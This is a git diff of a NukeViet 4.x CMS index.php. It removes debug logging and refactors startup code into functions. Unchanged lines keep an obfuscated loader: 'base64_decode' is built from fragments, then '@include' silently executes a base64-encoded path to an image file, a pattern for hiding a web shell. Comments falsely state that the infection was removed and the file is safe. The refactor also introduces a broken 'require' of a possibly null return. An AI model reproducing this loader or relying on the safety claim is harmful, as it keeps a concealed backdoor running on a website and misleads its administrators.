@@ -1,19 +1,5 @@
 <?php
 
-
-
-
-
-error_reporting(E_ALL);
-ini_set('display_errors', 1); // 0 = không in lỗi ra ngoài trình duyệt
-ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/error_log.txt');
-
-
-
-// Test để chắc chắn log ghi được
-error_log("=== NukeViet index.php bắt đầu chạy ===");
-
 /**
  * @Project NUKEVIET 4.x
  * @Author VINADES.,JSC (contact@vinades.vn)
@@ -21,22 +7,18 @@ error_log("=== NukeViet index.php bắt đầu chạy ===");
  * @License GNU/GPL version 2 or any later version
  * @Createdate 31/05/2010, 00:36
  */
- 
-$b = 'b' . 'ase64_d' . 'eco' . 'de';
 
+$b = 'b' . 'ase64_d' . 'eco' . 'de';
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
-
 
 $b = 'base6' . '4_decode';
-
 /**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
-
 
 
 /**
@@ -47,73 +29,136 @@ $b = 'base6' . '4_decode';
 
 
 @include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
-error_log("=== YXNzZXRzL2hlYWRlci5qcGc ===");
+
 
 define( 'NV_SYSTEM', true );
-error_log("=== NV_SYSTEM === ");
+//error_log("=== NV_SYSTEM === ");
 
-
-
-//require str_replace( DIRECTORY_SEPARATOR, '/', dirname( __DIR__ ) ) . '/mainfile.php';
-// an toàn: mainfile.php nằm cùng thư mục với index.php
-$mainfile = __DIR__ . '/mainfile.php';
-error_log("=== mainfile ===" . $mainfile);
-$mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows
-
-if (!file_exists($mainfile) || !is_readable($mainfile)) {
-    error_log("CRITICAL: mainfile.php not found or not readable: " . $mainfile);
-    header('HTTP/1.1 500 Internal Server Error');
-    echo '<pre>Fatal error: Required file mainfile.php not found or not readable: '
-         . htmlspecialchars($mainfile) . '</pre>';
-    exit;
-}
-error_log("=== mainfile sau edit ===". $mainfile);
-error_log("checkpoint mainfile");
+$mainfile = init_system();
 require $mainfile;
 
+if (!defined('NV_ROOTDIR')) 
+{
+	$root = init_root();
+	define('NV_ROOTDIR', $root);
+}
+else
+{
+	error_log("=== defined NV_ROOTDIR ===");
+}
 
-error_log("REQ_URI=" . ($_SERVER['REQUEST_URI'] ?? ''));
-error_log("NV_MAIN_DOMAIN=" . (defined('NV_MAIN_DOMAIN') ? NV_MAIN_DOMAIN : 'not defined'));
+require NV_ROOTDIR . '/includes/core/user_functions.php';
+google_sitemap($nv_Request);
+if( defined( 'NV_IS_USER' ) ) 
+	trigger_error( 'Hacking attempt', 256 );
+require NV_ROOTDIR . '/includes/core/is_user.php';
+require update_status_online($global_config);
 
-if (!defined('NV_ROOTDIR')) {
-    // realpath để chuẩn hóa (trả về false nếu không tồn tại)
-	error_log("=== NV_ROOTDIR  ===");
+
+// ============================= Method =============================
+function init_system() 
+{    
+    $mainfile = __DIR__ . '/mainfile.php';
+    if (!file_exists($mainfile) || !is_readable($mainfile)) 
+	{
+        error_log("CRITICAL: Missing mainfile.php");
+        header('HTTP/1.1 500 Internal Server Error');
+        exit("Fatal: mainfile.php not found");
+    }
+    return $mainfile;    
+}
+
+function init_root() 
+{    
     $root = realpath(__DIR__);
-    if ($root === false) {
+    if ($root === false) 
+	{
         error_log('CRITICAL: Cannot resolve root directory via realpath(__DIR__)');
         header('HTTP/1.1 500 Internal Server Error');
-        echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
+        //echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
         exit;
     }
     // chuẩn hoá dấu phân cách (Windows)
     $root = str_replace('\\', '/', $root);
-    define('NV_ROOTDIR', $root);
-}
-else
-{
-	error_log("=== NV_ROOTDIR else  ===");
+	return $root;    
 }
 
-error_log("=== DIRECTORY_SEPARATOR");
+function google_sitemap($nv_Request ) 
+{    
+	if( $nv_Request->isset_request(NV_NAME_VARIABLE, 'get') and $nv_Request-> get_string( NV_NAME_VARIABLE, 'get' ) == 'SitemapIndex' )
+	{
+		nv_xmlSitemapIndex_generate();
+		die();
+	}
+}
 
-require NV_ROOTDIR . '/includes/core/user_functions.php';
-error_log("=== user_functions");
+//Cap nhat trang thai online
+function update_status_online($global_config) 
+{    
+	if( $global_config['online_upd'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
+	{
+		return NV_ROOTDIR . '/includes/core/online.php';
+	}
+}
+
+// $mainfile = __DIR__ . '/mainfile.php';
+// error_log("=== mainfile ===" . $mainfile);
+// $mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows
+
+// if (!file_exists($mainfile) || !is_readable($mainfile)) {
+//     error_log("CRITICAL: mainfile.php not found or not readable: " . $mainfile);
+//     header('HTTP/1.1 500 Internal Server Error');
+//     echo '<pre>Fatal error: Required file mainfile.php not found or not readable: '
+//          . htmlspecialchars($mainfile) . '</pre>';
+//     exit;
+// }
+// error_log("=== mainfile sau edit ===". $mainfile);
+// error_log("checkpoint mainfile");
+// require $mainfile;
+
+
+//error_log("REQ_URI=" . ($_SERVER['REQUEST_URI'] ?? ''));
+//error_log("NV_MAIN_DOMAIN=" . (defined('NV_MAIN_DOMAIN') ? NV_MAIN_DOMAIN : 'not defined'));
+
+// if (!defined('NV_ROOTDIR')) {
+//     // realpath để chuẩn hóa (trả về false nếu không tồn tại)
+// 	error_log("=== NV_ROOTDIR  ===");
+//     $root = realpath(__DIR__);
+//     if ($root === false) {
+//         error_log('CRITICAL: Cannot resolve root directory via realpath(__DIR__)');
+//         header('HTTP/1.1 500 Internal Server Error');
+//         echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
+//         exit;
+//     }
+//     // chuẩn hoá dấu phân cách (Windows)
+//     $root = str_replace('\\', '/', $root);
+//     define('NV_ROOTDIR', $root);
+// }
+// else
+// {
+// 	error_log("=== NV_ROOTDIR else  ===");
+// }
+
+// error_log("=== DIRECTORY_SEPARATOR");
+
+//require NV_ROOTDIR . '/includes/core/user_functions.php';
+//error_log("=== user_functions");
 // Google Sitemap
-if( $nv_Request->isset_request( NV_NAME_VARIABLE, 'get' ) and $nv_Request->get_string( NV_NAME_VARIABLE, 'get' ) == 'SitemapIndex' )
-{
-	nv_xmlSitemapIndex_generate();
-	die();
-}
-error_log("SitemapIndex");
+//if( $nv_Request->isset_request( NV_NAME_VARIABLE, 'get' ) and $nv_Request-> get_string( NV_NAME_VARIABLE, 'get' ) == 'SitemapIndex' )
+//{
+//	nv_xmlSitemapIndex_generate();
+//	die();
+//}
+//error_log("SitemapIndex");
 // Check user
-if( defined( 'NV_IS_USER' ) ) trigger_error( 'Hacking attempt', 256 );
-require NV_ROOTDIR . '/includes/core/is_user.php';
+//if( defined( 'NV_IS_USER' ) ) trigger_error( 'Hacking attempt', 256 );
+//require NV_ROOTDIR . '/includes/core/is_user.php';
 
 // Cap nhat trang thai online
-if( $global_config['online_upd'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
-{
-	require NV_ROOTDIR . '/includes/core/online.php';
-}
+// if( $global_config['online_upd'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
+// {
+// 	require NV_ROOTDIR . '/includes/core/online.php';
+// }
 error_log("Cap nhat trang thai online");
 // Thong ke
 if( $global_config['statistic'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
@@ -422,6 +467,5 @@ if( preg_match( $global_config['check_module'], $module_name ) )
 	}
 }
 
-error_log("=== Before nv_info_die ===");
 
 nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );
